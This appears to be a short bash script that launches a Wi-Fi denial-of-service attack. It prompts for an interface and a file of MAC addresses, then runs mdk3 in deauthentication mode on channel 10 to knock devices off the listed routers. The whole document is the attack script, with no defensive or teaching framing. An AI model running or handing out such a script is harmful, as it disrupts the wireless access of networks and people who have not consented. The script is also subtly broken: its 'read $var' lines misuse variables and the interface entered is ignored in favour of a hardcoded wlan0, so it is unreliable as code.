echo "Enter the interface : "
read $interface
echo "Enter the mac-address .txt file : " 
read $file
echo "DoS router started by mdk3 ..." 
mdk3 wlan0 d -b $file -c 10
